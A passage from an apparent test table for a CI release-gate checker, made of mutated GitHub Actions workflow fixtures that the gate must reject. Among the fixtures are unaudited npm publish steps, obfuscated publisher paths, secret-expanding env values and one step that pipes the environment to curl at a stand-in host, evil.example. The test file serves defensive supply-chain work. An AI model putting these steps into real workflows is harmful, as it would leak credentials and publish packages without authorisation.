        withDefect('      - name: Pack\n', '      - name: Sneak\n        run: npm --loglevel=error publish ./packages/tokens --tag latest\n      - name: Pack\n'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'release',
        'release.yml',
      ),
  },
  { what: 'REL3: a publisher run through an interpreter named by path', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: /usr/bin/node scripts/publish-lat*.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a publisher run through `$(which node)`', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: $(which node) scripts/publish-lat*.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a local action OUTSIDE .github/actions is resolved and read', run: () => { const { actions, problems } = collectUsedLocalActions([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - uses: ./tools/promote\n' }], () => ({ file: 'tools/promote/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: node scripts/publish-latest.mjs\n      shell: bash\n' })); return [...problems, ...checkCompositeActionsDoNotPublish(actions)]; } },
  { what: 'REL3: a local action reference that cannot be resolved', run: () => collectUsedLocalActions([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - uses: ./.github/actions/ghost\n' }], () => null).problems },
  { what: 'REL3: a JOB-level `uses:` of a local action is resolved too', run: () => collectUsedLocalActions([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    uses: ./tools/promote\n' }], () => null).problems },
  // The GH_TOKEN exemption must be tied to the step that needs it (REL3 pass 10, reducer with a runtime
  // proof, debugger independently): borrowing the exempt key on any other step published green.
  { what: 'REL3: the exempt GH_TOKEN borrowed by a wrapper step in the release job', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Promote\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: node tools/promote.mjs\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: the exempt GH_TOKEN borrowed by a wrapper step in the payload job', run: () => checkWorkflowUsesDerivedSet(withPayloadDefect('      - name: Pack', '      - name: Promote\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: node tools/promote.mjs\n      - name: Pack'), ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml') },
  // Arms whose probes used spellings that did not exercise them (REL3 pass 10, debugger).
  { what: 'REL3: an UPPERCASE `${{ SECRETS.X }}` expansion (the expression language is case-insensitive)', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Sneak\n        env:\n          T: ${{ SECRETS.PAT }}\n        run: echo hi\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: a flag BETWEEN `dist-tag` and `add`', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Promote\n        run: npm dist-tag --loglevel=error add @spec-kitty/tokens@0.0.1 latest\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  // `${{ github.token }}` under another name is the same credential (REL3 pass 9, debugger).
  { what: 'REL3: `${{ github.token }}` in an audited job env value under another name', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Sneak\n        env:\n          T: ${{ github.token }}\n        run: echo hi\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: `toJSON(secrets)`, which hands over every secret at once', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Sneak\n        env:\n          T: ${{ toJSON(secrets) }}\n        run: echo hi\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: GH_TOKEN carrying a real secret rather than github.token', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Sneak\n        env:\n          GH_TOKEN: ${{ secrets.PAT }}\n        run: echo hi\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3 discovery: an unaudited job taking `${{ github.token }}` in its run', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: echo "//npm.pkg.github.com/:_x=${{ github.token }}" > /tmp/x\n' }]) },
  { what: 'REL3: `npm dist-tag add` behind a flag, in the audited release job', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Promote\n        run: npm --loglevel=error dist-tag add @spec-kitty/tokens@0.0.1 latest\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: `npm dist-tag add` behind a flag, in the audited payload job', run: () => checkWorkflowUsesDerivedSet(withPayloadDefect('      - name: Pack', '      - name: Promote\n        run: npm --loglevel=error dist-tag add @spec-kitty/tokens@0.0.1 rc\n      - name: Pack'), ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml') },
  { what: 'REL3 discovery: an `_auth` npmrc line, the sibling key of `_authToken`', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    env:\n      K: x\n    steps:\n      - run: echo "//npm.pkg.github.com/:_auth=$K" > ~/.npmrc\n' }]) },
  { what: 'REL3: an inline `npm publish` in the audited PAYLOAD job', run: () => checkWorkflowUsesDerivedSet(withPayloadDefect('      - name: Pack', '      - name: Sneak\n        run: npm publish ./packages/tokens --tag rc\n      - name: Pack'), ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml') },
  // Pass 8, debugger: the prod job was the one place `npm dist-tag add` was permitted, its
  // inline-publish test was the weaker of the two, and no rule read an `env:` VALUE for a secret.
  { what: 'REL3: `npm dist-tag add` inside the audited release job', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Promote\n        run: npm dist-tag add @spec-kitty/tokens@0.0.1 latest\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  // ISOLATES NPM_FLAGS. The audited-job version of this case trips the hoisted inline-publish rule as
  // well, so it would stay green with the flag widening reverted — a decoy. Discovery has no such
  // second rule, so this one fails alone.
  { what: 'REL3 discovery: `npm --workspace <dir> publish`, a flag whose value is a separate word', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: npm --workspace packages/tokens publish\n' }]) },
  { what: 'REL3: `npm --workspace <dir> publish` (a flag whose value is a separate word)', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Sneak\n        run: npm --workspace packages/tokens publish --tag latest\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: a secret in an audited job env value under another name', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Sneak\n        env:\n          T: ${{ secrets.GITHUB_TOKEN }}\n        run: echo hi\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: a secret in the audited PAYLOAD job env value under another name', run: () => checkWorkflowUsesDerivedSet(withPayloadDefect('      - name: Pack', '      - name: Sneak\n        env:\n          T: ${{ secrets.GITHUB_TOKEN }}\n        run: echo hi\n      - name: Pack'), ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml') },
  // Arms the debugger measured as still masked: every composite fixture tripped two arms at once.
  { what: 'REL3 composite: an action whose ONLY signal is `npm publish`', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: npm publish\n      shell: bash\n' }]) },
  { what: 'REL3 composite: an action whose ONLY signal is expanding a secret', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: curl -u "x:${{ secrets.CODECOV_TOKEN }}" https://example.invalid\n      shell: bash\n' }]) },
  { what: 'REL3: a `?` wildcard in a publisher path', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: node scripts/publish-la?est.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  // ONE FIXTURE PER CREDENTIAL ARM (REL3 pass 8, architect and reducer, independently): splitting the
  // predicate re-opened the gap its own pass-6 probes had closed — each arm was load-bearing, and
  // deleting either left the table green.
  { what: 'REL3 discovery: a run writing `_authToken` with the secret taken through env:', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    env:\n      T: x\n    steps:\n      - run: echo "//npm.pkg.github.com/:_authToken=$T" >> .npmrc\n' }]) },
  { what: 'REL3 discovery: a run expanding a secret with no registry credential named', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: curl -u "x:${{ secrets.CODECOV_TOKEN }}" https://example.invalid\n' }]) },
  { what: 'REL3: a publisher path assembled by command substitution', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: node scripts/$(echo publish-latest).mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  // Shell expansions that are not `*` or `$…` (REL3 pass 8, reviewer): each expands to the real
  // publisher in this tree, verified with `ls`.
  { what: 'REL3: a publisher path spelled with a bracket expression', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: node scripts/[pr]ublish-latest.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a publisher path whose extension is a bracket expression', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: node scripts/publish-latest.mj[s]\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a publisher path spelled with brace expansion', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: node scripts/publish-latest.{mjs,js}\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  // Pass 7. The within-job credential rule, the local-action `with:` signal, and the token rule's
  // new precision (a token that CANNOT resolve to a registry script is not refused).
  { what: 'REL3: an audited step writing an .npmrc auth line from a secret', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Sneak\n        run: echo "//npm.pkg.github.com/:_authToken=${{ secrets.GITHUB_TOKEN }}" > ~/.npmrc && node tools/pub.mjs\n      - name: Pack\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  { what: 'REL3: an audited payload step expanding a secret in its run', run: () => checkWorkflowUsesDerivedSet(withPayloadDefect('      - name: Pack', '      - name: Sneak\n        run: echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/t\n      - name: Pack'), ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml') },
  { what: 'REL3 discovery: a secret handed to a LOCAL action through `with:`', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - uses: ./.github/actions/promote\n        with:\n          token: ${{ secrets.GITHUB_TOKEN }}\n' }]) },
  { what: 'REL3: a publisher path spelled with quoted concatenation', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: node scripts/publish-lat"est".mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  // THE INDIRECTION CLASS (REL3 pass 6, debugger): every one of these must bring the credential into
  // the workflow file, because only the workflow can expand `${{ secrets.* }}`. That is the arm these
  // probes hold — not the spelling of the wrapper.
  { what: 'REL3 discovery: a token echoed into .npmrc, then a shell wrapper', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: |\n          echo "//npm.pkg.github.com/:_authToken=${{ secrets.GITHUB_TOKEN }}" >> ~/.npmrc\n          bash scripts/promote.sh\n' }]) },
  { what: 'REL3 discovery: a token in the run, then `make promote`', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: |\n          echo "NODE_AUTH_TOKEN=${{ secrets.GITHUB_TOKEN }}" >> "$GITHUB_ENV"\n          make promote\n' }]) },
  { what: 'REL3 discovery: a token in the run, then `npm run -w <workspace>`', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: echo "//npm.pkg.github.com/:_authToken=${{ secrets.GITHUB_TOKEN }}" >> .npmrc && npm run -w @spec-kitty/tokens promote\n' }]) },
  { what: 'REL3: a WORKSPACE manifest script that reaches the publisher', run: () => checkNoIndirectPublishScripts({ scripts: { promote: 'node ../../scripts/publish-latest.mjs' } }, 'packages/tokens/package.json') },
  { what: 'REL3 composite: an action holding the token for the whole action (runs.env)', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  env:\n    NODE_AUTH_TOKEN: x\n  steps:\n    - run: echo hi\n      shell: bash\n' }]) },
  { what: 'REL3: the release job forging GITHUB_REF_NAME', run: () => checkWorkflowUsesDerivedSet(withDefect('      - name: Pack\n', '      - name: Pack\n        env:\n          GITHUB_REF_NAME: v9.9.9\n'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml') },
  // SINGLE-SIGNAL probes (REL3 pass 6, reducer): every discovery fixture carried two or three signals,
  // so deleting one clause left the table green while that shape passed. One fixture per clause.
  { what: 'REL3 discovery: a job whose ONLY signal is holding NODE_AUTH_TOKEN', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - env:\n          NODE_AUTH_TOKEN: x\n        run: echo hi\n' }]) },
  { what: 'REL3 discovery: a job whose ONLY signal is `npm publish`', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: npm publish\n' }]) },
  { what: 'REL3 discovery: a job whose ONLY signal is a registry script', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: node scripts/report-dist-tags.mjs\n' }]) },
  { what: 'REL3 discovery: a job whose ONLY signal is writing an .npmrc auth token', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    steps:\n      - run: echo "//npm.pkg.github.com/:_authToken=${{ secrets.GITHUB_TOKEN }}" >> .npmrc\n' }]) },
  { what: 'REL3 composite: an action whose ONLY signal is holding NODE_AUTH_TOKEN', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: echo hi\n      shell: bash\n      env:\n        NODE_AUTH_TOKEN: x\n' }]) },
  { what: 'REL3 composite: an action whose ONLY signal is writing an .npmrc auth token', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: echo "//npm.pkg.github.com/:_authToken=$TOKEN" >> .npmrc\n      shell: bash\n' }]) },
  { what: 'REL3 composite: the action set certified over no files at all', run: () => checkCompositeActionsDoNotPublish([], { dirExists: true }) },
  { what: 'REL3: an interpreter flag hiding a globbed publisher path', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node --no-warnings scripts/publish-lat*.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: an npm script with a flag before a globbed path', run: () => checkNoIndirectPublishScripts({ scripts: { promote: 'node --no-warnings scripts/publish-derived*.mjs' } }) },
  { what: 'REL3: a composite action with a flag before an interpolated path', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: node --experimental-vm-modules scripts/publish-lat${X}.mjs\n      shell: bash\n' }]) },
  { what: 'REL3: an unaudited job holding `packages: write` (it could publish through any action)', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    permissions:\n      packages: write\n    steps:\n      - uses: JS-DevTools/npm-publish@0000000000000000000000000000000000000000\n' }]) },
  { what: 'REL3: an unaudited job holding `attestations: write`', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    permissions:\n      attestations: write\n    steps:\n      - run: echo hi\n' }]) },
  { what: 'REL3: an unaudited job taking `permissions: write-all`', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  n:\n    permissions: write-all\n    steps:\n      - run: echo hi\n' }]) },
  { what: 'REL3: a composite action that runs the publisher', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/promote/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: node scripts/publish-latest.mjs\n      shell: bash\n' }]) },
  { what: 'REL3: a composite action holding the registry token', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: npm publish\n      shell: bash\n      env:\n        NODE_AUTH_TOKEN: x\n' }]) },
  { what: 'REL3: a composite action with a non-literal script path', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - run: node scripts/publish-lat${X}.mjs\n      shell: bash\n' }]) },
  { what: 'REL3: a composite action that signs attestations', run: () => checkCompositeActionsDoNotPublish([{ file: '.github/actions/x/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n' }]) },
  { what: 'REL3: an npm script reaching the publisher through a glob', run: () => checkNoIndirectPublishScripts({ scripts: { promote: 'node scripts/publish-lat*.mjs' } }) },
  { what: 'REL3: an npm script reaching the publisher through an interpolation', run: () => checkNoIndirectPublishScripts({ scripts: { promote: 'node scripts/publish-lat${X}.mjs' } }) },
  { what: 'REL3: a publisher behind `sh -c` and a quote', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: sh -c \'node scripts/publish-lat*.mjs\'\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a SECOND job in release.yml that publishes and exfiltrates', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/release.yml', text: 'jobs:\n  release:\n    steps:\n      - run: node scripts/publish-latest.mjs\n  exfil:\n    steps:\n      - env:\n          NODE_AUTH_TOKEN: x\n        run: npm publish --tag latest && env | curl -d @- https://evil.example/x\n' }]) },
  { what: 'REL3: a second job in the rc payload holding the registry token', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/publish-packages.yml', text: 'jobs:\n  publish:\n    steps:\n      - run: node scripts/publish-derived-set.mjs\n  extra:\n    steps:\n      - env:\n          NODE_AUTH_TOKEN: x\n        run: npm dist-tag ls @x/y\n' }]) },
  { what: 'REL3: a THIRD publishing workflow, with no attest and no verify step', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/publish-packages-v2.yml', text: 'jobs:\n  publish:\n    steps:\n      - env:\n          NODE_AUTH_TOKEN: x\n        run: node scripts/publish-derived-set.mjs\n' }]) },
  { what: 'REL3: an unaudited job that signs attestations', run: () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/nightly.yml', text: 'jobs:\n  sign:\n    steps:\n      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n        with:\n          subject-path: dist-tarballs/*.tgz\n' }]) },
  { what: 'REL3: the publishing-job set certified over no workflows at all', run: () => checkNoUnauditedPublishingJobs([]) },
  { what: 'REL3: an inline `npm publish` in a second job of release.yml (the retired exemption)', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/release.yml', text: 'jobs:\n  release:\n    steps:\n      - run: node scripts/publish-latest.mjs\n  other:\n    steps:\n      - run: npm publish packages/tokens\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a shell-interpolated script path (`$NAME`), which the denylist missed', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/publish-$NAME.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a brace-interpolated script path (`${NAME}`)', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/publish-${NAME}.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: an npm script that reaches the prod publisher', run: () => checkNoIndirectPublishScripts({ scripts: { release: 'node scripts/publish-latest.mjs' } }) },
  { what: 'REL3: an npm script that reaches the rc publisher', run: () => checkNoIndirectPublishScripts({ scripts: { rc: 'nx build && node scripts/publish-derived-set.mjs' } }) },
  { what: 'REL3: a glob in a node script path (the shell expands it, the gate cannot read it)', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/publish-lat*.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: a quoted split in a node script path', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/publish-lat"est".mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
  { what: 'REL3: release.yml also triggered by workflow_dispatch', run: () => withTrigger('on:\n', 'on:\n  workflow_dispatch:\n') },
  { what: 'REL3: release.yml push trigger gains a branches filter', run: () => withTrigger("    tags: ['v*.*.*']\n", "    tags: ['v*.*.*']\n    branches: [main]\n") },
  { what: 'REL3: release.yml tag filter loosened to any tag', run: () => withTrigger("tags: ['v*.*.*']", "tags: ['*']") },
  { what: 'REL3: release.yml tag filter gains a second pattern', run: () => withTrigger("tags: ['v*.*.*']", "tags: ['v*.*.*', 'rc-*']") },
  { what: 'REL3: release.yml triggered by pull_request instead of push', run: () => withTrigger('  push:\n', '  pull_request:\n') },
  {
    what: 'REL3: a manifest `publishConfig.tag` (the channel whenever a publish omits --tag)',
    run: () => checkNoManifestDistTag([{ name: '@x/a', publishConfig: { registry: 'r', tag: 'next' } }]),
  },
  {
    what: 'REL3: a manifest top-level `tag`',
    run: () => checkNoManifestDistTag([{ name: '@x/a', tag: 'latest' }]),
  },
  {
    what: 'a package marked private with no EXPECTED_PRIVATE entry',
    run: () => checkNothingSilentlyPrivate([{ name: '@x/a', private: true }], []),
  },
  {
    what: 'an EXPECTED_PRIVATE entry for a package that is not private',
    run: () => checkNothingSilentlyPrivate([{ name: '@x/a', private: false }], ['@x/a']),
  },
  {
    what: 'no tarballs at all',
    run: () => checkTarballsNonEmpty([]),
  },
  {
    what: 'a tarball with zero files',
    run: () => checkTarballsNonEmpty([{ name: '@x/a', files: [] }]),
  },
  {
    what: 'an exports target absent from the tarball',
    run: () => checkExportsResolve([{ name: '@x/a', files: ['dist/index.js'], exports: { '.': './dist/missing.js' } }]),
  },
  {
    what: 'an exports WILDCARD matching zero files',
    run: () => checkExportsResolve([{ name: '@x/a', files: ['dist/index.js'], exports: { './css/*': './css/*' } }]),
  },
  {
    what: 'an exports target hidden inside a conditions object',
    run: () => checkExportsResolve([{ name: '@x/a', files: ['dist/index.js'], exports: { '.': { types: './dist/nope.d.ts', default: './dist/index.js' } } }]),
  },
  {
    what: 'a component directory with no subpath export',
    run: () => checkSubpathCoverage(['button', 'card'], ['.', './button/*'], '@x/styles'),
  },
  {
    what: 'subpath coverage asserted over zero component directories',
    run: () => checkSubpathCoverage([], ['.'], '@x/styles'),
  },
  // Every probe below reproduces an attack a pass-1 lens actually got past this gate.
  {
    what: 'an exports map from which no target path can be read',
    run: () => checkExportsResolve([{ name: '@x/a', files: ['package.json', 'dist/index.js'], exports: {} }]),
  },
  {
    what: 'a manifest-and-README tarball with no payload',
    run: () => checkTarballsNonEmpty([{ name: '@x/a', files: ['package.json', 'README.md', 'LICENSE'] }]),
  },
  {
    what: 'a "main" that is not in the tarball, with no exports map',
    run: () => checkLegacyEntriesResolve([{ name: '@x/a', files: ['package.json'], main: './dist/index.js' }]),
  },
  {
    what: 'a package declaring neither exports nor main',
    run: () => checkLegacyEntriesResolve([{ name: '@x/a', files: ['package.json', 'dist/index.js'] }]),
  },
  {
    what: 'a release workflow with no publish step at all',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withDefect('        run: node scripts/publish-latest.mjs\n', '        run: echo "release complete"\n'),
        ['@spec-kitty/tokens'], ['tokens'],
      ),
  },
  {
    what: 'a release workflow with no packed Vue declaration check',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withDefect(
          '      - name: Packed Vue declarations\n        run: node scripts/check-vue-packed-types.mjs\n',
          '',
        ),
        ['@spec-kitty/tokens'], ['tokens'],
      ),
  },
  {
    what: 'a publish step satisfied only by its NAME, not by a command',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withDefect(
          /      - name: Publish\n        run: node scripts\/publish-latest\.mjs\n/,
          '      - name: "was: npm publish over the derived set"\n        run: echo done\n',
        ),
        ['@spec-kitty/tokens'], ['tokens'],
      ),
  },
  {
    what: 'the deriving step deleted, leaving only check-release-graph.mjs (a substring match)',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withDefect(/          PROJECTS=[^\n]*\n          DIRS=[^\n]*\n/, '          echo derived\n'),
        ['@spec-kitty/tokens'], ['tokens'],
      ),
  },
  {
    what: 'one hand-written step per package, identified by working-directory',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withDefect('      - name: SBOM', '      - name: Publish tokens\n        run: npm publish\n        working-directory: packages/tokens\n      - name: SBOM'),
        ['@spec-kitty/tokens'], ['tokens'],
      ),
  },
  {
    what: 'an enumeration smuggled into a block that also derives',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withDefect('          echo "dirs=$DIRS" >> "$GITHUB_OUTPUT"', '          echo "dirs=$DIRS" >> "$GITHUB_OUTPUT"\n          for p in tokens styles elements react; do echo $p; done'),
        ['@spec-kitty/tokens', '@spec-kitty/styles'], ['tokens', 'styles', 'elements', 'react'],
      ),
  },
  {
    what: 'a release step carrying continue-on-error',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withDefect('      - name: Publish\n', '      - name: Publish\n        continue-on-error: true\n'),
        ['@spec-kitty/tokens'], ['tokens'],
      ),
  },
  // ── REL2 (#363): the reusable publish payload and its thin callers ───────────────────────
  // Both of these guards were demonstrated by hand before being fixtured, and a hand
  // demonstration protects nothing — it lives in a shell history, not in the table. The
  // `publish`-job path and checkPublishingCallersDelegate had zero coverage between them, which
  // is the same unfixtured-guard shape this file exists to refuse.
  {
    what: 'the reusable publish payload missing a gate every stream must run',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: Audit\n {8}run: \|\n {10}for pkg in [^\n]*npm pack[^\n]*\n/, ''),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // MEASURED GREEN BEFORE THE GUARD EXISTED. Deleting `--tag "$TAG"` from the real
    // publish-packages.yml left `check-release-graph.mjs` (and every other gate in the repo)
    // passing, because the bare-publish assertion above still matched. A tagless publish writes
    // `latest`, and on a package with no existing versions that claims the prod channel from the
    // rc stream — irreversibly. The mutation keeps `npm publish` intact so it can only be caught
    // by the `--tag` assertion, not by the one above it.
    what: 'the reusable publish payload publishing WITHOUT --tag (npm would write `latest`)',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/run: node scripts\/publish-derived-set\.mjs/, 'run: npm publish'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    what: 'the reusable publish payload not publishing at all',
    run: () =>
      checkWorkflowUsesDerivedSet(
        // Anchored on the loop body, because the fixture publishes over the derived set rather
        // than with a bare command. `withPayloadDefect` THROWS when the anchor stops matching —
        // without that, the "mutant" is identical to the pristine fixture and the probe certifies
        // nothing while still reporting itself as passing. A lens demonstrated exactly that.
        withPayloadDefect(/run: node scripts\/publish-derived-set\.mjs/, 'run: echo "published"'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  // ── Pass-2 review: every one of these was MEASURED GREEN before its guard existed ─────────
